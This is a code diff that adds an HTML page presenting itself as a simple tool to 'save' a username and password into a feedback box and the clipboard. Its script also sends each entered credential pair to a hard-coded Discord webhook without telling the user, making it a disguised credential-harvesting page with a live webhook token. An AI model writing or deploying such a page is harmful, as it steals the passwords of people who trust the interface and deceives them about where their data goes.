@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Save Credentials to Feedback Box</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #eceff1;
+            display: flex; 
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+        }
+        .form-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        input, button, textarea {
+            margin: 10px 0;
+            padding: 10px;
+            width: 90%;
+        }
+        button {
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-box">
+    <h2>Save Credentials</h2>
+    <input type="text" id="username" placeholder="Enter Username"><br>
+    <input type="password" id="password" placeholder="Enter Password"><br>
+    <button onclick="copyCredentials()">Save</button>
+
+    <textarea id="feedback" rows="6" placeholder="Your saved username and password will appear here..." readonly></textarea>
+</div>
+
+<script>
+function copyCredentials() {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (username && password) {
+        const combined = `Username: ${username}\nPassword: ${password}`;
+        
+        // Put into feedback box
+        const feedbackBox = document.getElementById('feedback');
+        feedbackBox.value = combined;
+
+        // Copy to clipboard
+        navigator.clipboard.writeText(combined).then(() => {
+            alert('Username and Password copied to clipboard and saved in the box!');
+        }).catch(err => {
+            alert('Failed to copy! But saved in the box.');
+        });
+
+        // Send the data to Discord webhook
+        sendToDiscord(combined);
+    } else {
+        alert('Please enter both username and password!');
+    }
+}
+
+function sendToDiscord(data) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1363312474669060329/ZPCMVbUp_I5zdtg0g0R3t4-nNB_sVIaqB_L1xV2q99Azp9UT9Bl5iSz71eATQxV1jqBZ';
+
+    const payload = {
+        content: `**New Credentials Submitted**\n${data}`,
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Successfully sent data to Discord!');
+        } else {
+            console.error('Failed to send data to Discord:', response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error('Error sending to Discord:', error);
+    });
+}
+</script>
+
+</body>
+</html>
